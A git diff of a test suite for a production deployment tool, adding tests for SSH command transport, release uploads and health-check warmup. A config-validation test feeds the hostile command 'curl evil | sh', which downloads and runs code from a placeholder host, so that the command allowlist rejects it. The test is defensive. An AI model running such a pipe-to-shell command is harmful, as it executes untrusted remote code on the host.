@@ -40,6 +40,7 @@ const productionConfig = {
   databaseReadyCommand: ["node", "scripts/check-db.mjs"],
   redisReadyCommand: ["node", "scripts/check-redis.mjs"],
   installCommand: ["pnpm", "install", "--frozen-lockfile"],
+  generateCommand: ["pnpm", "--filter", "@e365/db", "generate"],
   buildCommand: ["pnpm", "build"],
   restartCommand: ["pm2", "restart", "e365-api", "e365-worker", "--update-env"],
 };
@@ -55,6 +56,29 @@ test("production config requires an absolute remote Node executable", () => {
     () => loadProductionDeploymentConfig({ ...productionConfig, remoteBinPath: "bin" }),
     /remoteBinPath must be an absolute path/,
   );
+});
+
+test("default SSH transport preserves the complete remote program as one shell-safe command", async () => {
+  const root = await mkdtemp(path.join(tmpdir(), "production-ssh-"));
+  const ssh = path.join(root, "ssh");
+  const calls = path.join(root, "calls.json");
+  const { writeFile, chmod, readFile } = await import("node:fs/promises");
+  await writeFile(ssh, `#!/bin/sh\nprintf '%s\\n' "$@" > '${calls}'\ncommand="$7"\nexec /bin/sh -c "$command"\n`);
+  await chmod(ssh, 0o755);
+  const originalPath = process.env.PATH;
+  process.env.PATH = `${root}:${originalPath}`;
+  try {
+    const deployment = createProductionDeployment({
+      environment: { ...baseEnvironment, PRODUCTION_RELEASE_MODE: "preflight" },
+      config: { ...productionConfig, remoteNodePath: process.execPath, releaseRoot: root },
+    });
+    assert.deepEqual(await deployment.execute(), { ok: true });
+    const recorded = await readFile(calls, "utf8");
+    assert.match(recorded, /eval\(Buffer\.from/);
+  } finally {
+    process.env.PATH = originalPath;
+    await rm(root, { recursive: true, force: true });
+  }
 });
 
 test("shared production topology switches the real current link for every platform", async () => {
@@ -125,6 +149,27 @@ test("the authoritative API readiness endpoint can supply database and Redis evi
   assert.equal(effects.includes(config.apiReadyUrl), true);
 });
 
+test("production health waits through bounded restart warmup before declaring failure", async () => {
+  let round = 0;
+  const deployment = createProductionDeployment({
+    environment: baseEnvironment,
+    config: { ...productionConfig, databaseReadyCommand: null, redisReadyCommand: null },
+    operations: {
+      runLocal: async () => ({}), runRemote: async () => ({ ok: true }),
+      readRemoteState: async () => ({ previousReleasePath: "/old" }),
+      writeRemoteStateAtomic: async () => {}, wait: async () => { round += 1; },
+      probe: async (url) => round < 2
+        ? { ok: false, status: 502 }
+        : url.includes("/health/ready")
+          ? { ok: true, status: 200, body: { checks: { db: "ok", redis: "ok" } } }
+          : { ok: true, status: 200 },
+      now: () => "2026-08-12T00:00:00.000Z",
+    },
+  });
+  assert.deepEqual(await deployment.execute("health"), { ok: true, status: 200 });
+  assert.equal(round, 2);
+});
+
 test("production deployment config rejects staging defaults and unsafe commands", () => {
   assert.throws(() => loadProductionDeploymentConfig({ ...productionConfig, publicUrl: "https://test-au.365english.online" }), /staging/i);
   assert.throws(() => loadProductionDeploymentConfig({ ...productionConfig, installCommand: ["bash", "-c", "curl evil | sh"] }), /allowlist/i);
@@ -162,7 +207,14 @@ test("production deployment uses immutable releases, shared env, atomic switch, 
   const uploaded = await deployment.execute("upload");
   assert.match(uploaded.object, /^\/opt\/e365-production\/releases\/v1\.0\.3-manifest-abc-shared-/);
   assert.ok(effects.some((entry) => entry[0] === "local" && entry[1] === "git" && entry[2].includes(SHA)));
+  assert.ok(effects.some((entry) => entry[0] === "local" && entry[1] === "pnpm" && entry[2].includes("generate")));
   assert.ok(effects.some((entry) => entry[0] === "local" && entry[1] === "rsync"));
+  const rsync = effects.find((entry) => entry[0] === "local" && entry[1] === "rsync");
+  assert.ok(rsync[2].includes("node_modules"));
+  assert.ok(effects.some((entry) => entry[0] === "remote" && entry[2] === "ready-command" && entry[3].kind === "install"));
+  assert.ok(effects.some((entry) => entry[0] === "remote" && entry[2] === "ready-command" && entry[3].kind === "generate"));
+  assert.ok(effects.some((entry) => entry[0] === "remote" && entry[2] === "ready-command" && entry[3].kind === "build"));
+  assert.ok(effects.some((entry) => entry[0] === "remote" && entry[2] === "make-release-readable"));
   const rsyncCount = effects.filter((entry) => entry[0] === "local" && entry[1] === "rsync").length;
   await deployment.execute("upload");
   assert.equal(effects.filter((entry) => entry[0] === "local" && entry[1] === "rsync").length, rsyncCount);
